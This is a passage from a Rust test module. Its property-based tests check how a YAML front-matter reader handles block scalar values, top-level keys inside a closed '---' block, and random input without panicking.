                }
            }
            text.push_str("---\n");
            assert_eq!(field(&text, "k"), Some(want.join(" ")), "{text:?}");
        });
    }

    // spec: DSC-22
    #[test]
    fn a_block_value_reads_its_lines() {
        cases(0xf00d_0004, 10_000, |g| {
            let n = g.range(1, 5);
            // Blank lines only between text lines: a leading or trailing one
            // is trimmed off the displayed value.
            let lines: Vec<Option<String>> = (0..n)
                .map(|i| (i == 0 || i == n - 1 || !g.one_in(3)).then(|| gen_words(g).join(" ")))
                .collect();
            let base = g.range(1, 4);
            let literal = g.one_in(2);
            let mut text = format!(
                "---\nk: {}{}\n",
                if literal { "|" } else { ">" },
                g.pick(&["", "-", "+"])
            );
            let mut want_lines: Vec<String> = Vec::new();
            for line in &lines {
                match line {
                    Some(l) => {
                        // A literal block keeps extra indentation past the
                        // block's own, except on its first line, which sets
                        // the trimmed value's start.
                        let extra = if literal && !want_lines.is_empty() {
                            g.below(3)
                        } else {
                            0
                        };
                        text.push_str(&" ".repeat(base + extra));
                        text.push_str(l);
                        want_lines.push(format!("{}{l}", " ".repeat(extra)));
                    }
                    None => want_lines.push(String::new()),
                }
                text.push('\n');
            }
            text.push_str(g.pick(&["other: x\n", ""]));
            text.push_str("---\n");
            // YAML folding: adjacent text lines join with a space, and each
            // blank line is one line break.
            let want = if literal {
                want_lines.join("\n")
            } else {
                let mut out = String::new();
                let mut after_text = false;
                for l in &want_lines {
                    if l.is_empty() {
                        out.push('\n');
                        after_text = false;
                    } else {
                        if after_text {
                            out.push(' ');
                        }
                        out.push_str(l);
                        after_text = true;
                    }
                }
                out
            };
            assert_eq!(field(&text, "k"), Some(want), "{text:?}");
        });
    }

    // spec: DSC-20 DSC-24
    #[test]
    fn only_a_column_zero_key_inside_the_closed_block_is_read() {
        cases(0xf00d_0005, 10_000, |g| {
            let mut text = String::from(if g.one_in(4) {
                "\u{FEFF}---\n"
            } else {
                "---\n"
            });
            let mut want = None;
            for _ in 0..g.range(0, 5) {
                match g.below(4) {
                    0 if want.is_none() => {
                        let v = gen_words(g).join(" ");
                        text.push_str(&format!("k: {v}\n"));
                        want = Some(v);
                    }
                    // A nested `k:` is not a top-level key.
                    1 => text.push_str(&format!("{}:\n  k: nested\n", gen_other_key(g))),
                    _ => text.push_str(&format!(
                        "{}: {}\n",
                        gen_other_key(g),
                        gen_words(g).join(" ")
                    )),
                }
            }
            let closed = !g.one_in(4);
            if closed {
                text.push_str("---\n");
            }
            // The body may spell the key too.
            text.push_str(g.pick(&["", "k: from the body\n", "# T\n\nk: x\n"]));
            let want = if closed { want } else { None };
            assert_eq!(field(&text, "k"), want, "{text:?}");
        });
    }

    #[test]
    fn arbitrary_text_never_panics_the_reader() {
        cases(0xf00d_0006, 20_000, |g| {
            let mut text = String::new();
            for _ in 0..g.range(0, 8) {
                let line = match g.below(6) {
                    0 => "---".to_string(),
                    1 => format!("k: {}", g.any_string(0, 10)),
                    2 => format!(
                        "k: {}{}",
                        g.pick(&["|", ">", "'", "\"", "|-", ">+"]),
                        g.any_string(0, 6)
                    ),
                    3 => format!("{}{}", " ".repeat(g.below(4)), g.any_string(0, 10)),
                    _ => g.any_string(0, 12),
                };
                text.push_str(&line);
                text.push_str(g.pick(&["\n", "\r\n", "\n\n"]));
            }
            let _ = field(&text, "k");
        });
    }
}
